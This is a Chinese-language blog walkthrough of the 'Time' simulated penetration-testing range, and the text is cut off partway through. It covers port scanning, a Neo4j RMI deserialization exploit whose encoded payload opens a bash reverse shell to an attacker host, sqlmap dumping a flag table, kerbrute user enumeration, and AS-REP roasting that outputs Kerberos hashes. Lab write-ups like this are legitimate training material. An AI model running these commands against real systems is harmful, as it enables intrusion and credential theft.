---
title: 春秋云镜-【仿真场景】Time-writeup - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/17187354.html
source: 博客园 - 渗透测试中心
date: 2023-03-08
fetch_date: 2025-10-04T08:55:17.043849
---

# 春秋云镜-【仿真场景】Time-writeup - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [春秋云镜-【仿真场景】Time-writeup](https://www.cnblogs.com/backlion/p/17187354.html "发布于 2023-03-07 11:06")

## 说明

Time是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。

## 技术

Neo4j、Kerberos、Privilege Elevation、域渗透

## 第一个flag

### 外网IP信息收集

```
start infoscan
(icmp) Target '39.98.236.25' is alive
icmp alive hosts len is: 1
39.98.236.25:22 open
39.98.236.25:1337 open
39.98.236.25:7474 open
39.98.236.25:7473 open
39.98.236.25:7687 open
39.98.236.25:35555 open
alive ports len is: 6
start vulscan
已完成 0/6 [-] webtitle http://39.98.236.25:7473 Get "http://39.98.236.25:7473": net/http: HTTP/1.x transport connection broken: malformed HTTP response "\x15\x03\x03\x00\x02\x02P"
[*] WebTitle:http://39.98.236.25:7474  code:200 len:145    title:None
[*] WebTitle:http://39.98.236.25:7687  code:400 len:0      title:None
[*] WebTitle:https://39.98.236.25:7687 code:400 len:0      title:None
已完成 6/6
scan end
```

### neo4j 未授权RCE

Neo4j是一个开源图数据库管理系统。

在Neo4j 3.4.18及以前，如果开启了Neo4j Shell接口，攻击者将可以通过RMI协议以未授权的身份调用任意方法，其中setSessionVariable方法存在反序列化漏洞。因为这个漏洞并非RMI反序列化，所以不受到Java版本的影响。在Neo4j 3.5及之后的版本，Neo4j Shell被Cyber Shell替代。

[https://github.com/zwjjustdoit/CVE-2021-34371.jar](https://link.zhihu.com/?target=https%3A//github.com/zwjjustdoit/CVE-2021-34371.jar)

```
java -jar rhino_gadget.jar rmi://39.98.236.25:1337 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3R...NC81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}"
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110559021-177737673.png)

反弹shell

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110559740-99216481.png)

查找flag

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110600465-112496222.png)

获得第一个flag

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110601246-816106515.png)

## 第二个flag

### 内网渗透

上传代理和fscan

```
start infoscan
已完成 0/0 listen ip4:icmp 0.0.0.0: socket: operation not permitted
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.6.12     is alive
(icmp) Target 172.22.6.25     is alive
(icmp) Target 172.22.6.38     is alive
(icmp) Target 172.22.6.36     is alive
[*] Icmp alive hosts len is: 4
172.22.6.25:445 open
172.22.6.12:445 open
172.22.6.25:139 open
172.22.6.12:139 open
172.22.6.25:135 open
172.22.6.12:135 open
172.22.6.38:80 open
172.22.6.36:22 open
172.22.6.38:22 open
172.22.6.36:7687 open
172.22.6.12:88 open
[*] alive ports len is: 11
start vulscan
[+] NetInfo:
[*]172.22.6.25
   [->]WIN2019
   [->]172.22.6.25
[+] NetInfo:
[*]172.22.6.12
   [->]DC-PROGAME
   [->]172.22.6.12
[*] 172.22.6.12    [+]DC XIAORANG\DC-PROGAME        Windows Server 2016 Datacenter 14393
[*] 172.22.6.25          XIAORANG\WIN2019
[*] 172.22.6.12  (Windows Server 2016 Datacenter 14393)
[*] WebTitle:http://172.22.6.38        code:200 len:1531   title:后台登录
[*] WebTitle:https://172.22.6.36:7687  code:400 len:50     title:None
已完成 11/11
```

### sql注入

访问 [http://172.22.6.38](https://link.zhihu.com/?target=http%3A//172.22.6.38)，是一个登录页面，抓取数据包

```
POST /index.php HTTP/1.1
Host: 172.22.6.38
Content-Length: 30
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.22.6.38
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.22.6.38/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8
Connection: close

username=admin&password=111111
```

使用sqlmap测试注入（过程略）

```
sqlmap -r 1.txt --dump -T oa_f1Agggg -D oa_db  -batch
```

获得第二个flag

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110602079-2019239499.png)

里面还有oa\_admin表和oa\_users表，把users表中的500个用户名收集成字典 [username.txt](https://zhuanlan.zhihu.com/assets/username-20221110203059-rvc4o2i.txt)

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110603044-594852005.png)

## ‍‍第三个flag

### 域用户枚举

在kerberos的AS-REQ认证中当cname值中的用户不存在时返回包提示KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN，所以当我们没有域凭证时，可以通过Kerberos pre-auth从域外对域用户进行用户枚举

[https://github.com/ropnop/kerbrute](https://link.zhihu.com/?target=https%3A//github.com/ropnop/kerbrute)

```
proxychains ./kerbrute_linux_amd64 userenum --dc 172.22.6.12 -d xiaorang.lab username.txt -t 10
```

kali中用代理一直执行不成功，不出现结果，把文件传到入口机器上，远程执行才出结果

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110604060-1494380176.png)

共有74个用户，做成字典 [user.txt](https://zhuanlan.zhihu.com/assets/user-20221110205714-3frufsz.txt)

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110604911-275497764.png)

### AS-REPRoasting

对于域用户，如果设置了选项Do not require Kerberos preauthentication(不要求Kerberos预身份认证)，此时向域控制器的88端口发送AS-REQ请求，对收到的AS-REP内容重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat或是john对其破解，最终获得该用户的明文口令

查找未设置预认证的账号

```
proxychains python3 GetNPUsers.py -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110605674-1336457543.png)

得到两个账号 wenshao@xiaorang.lab 、zhangxin@xiaorang.lab

```
$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:b6c410706b5e96c693b2fc61ee1064c3$2dc9fbee784e7997333f30c6bc4298ab5752ba94be7022e807af418c11359fd92597e253752f4e61d2d18a83f19b5c9df4761e485853a3d879bcf7a270d6f846683b811a80dda3809528190d7f058a24996aff13094ff9b32c0e2698f6d639b4d237a06d13c309ce7ab428656b79e582609240b01fb5cd47c91573f80f846dc483a113a86977486cecce78c03860050a81ee19921d3500f36ff39fa77edd9d5614cf4b9087d3e42caef68313d1bb0c4f6bc5392943557b584521b305f61e418eb0f6eb3bf339404892da55134cb4bf828ac318fe00d68d1778b7c82caf03b65f1938e54ed3fa51b63cdb2994

$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:971802b84ce99050ad3c5f49d11fd0b7$6c1be075c3cf2a7695529de2ebbf39c5ec7e5326c9d891dac2107b239892f76befe52c860e4e1e2ff6537a5765a6bcb6b8baca792d60765ac0bbe1b3c5e59f3ec51b7426636a437d5df12130eb68d9b17ef431455415671c7331a17ce823e28cc411677...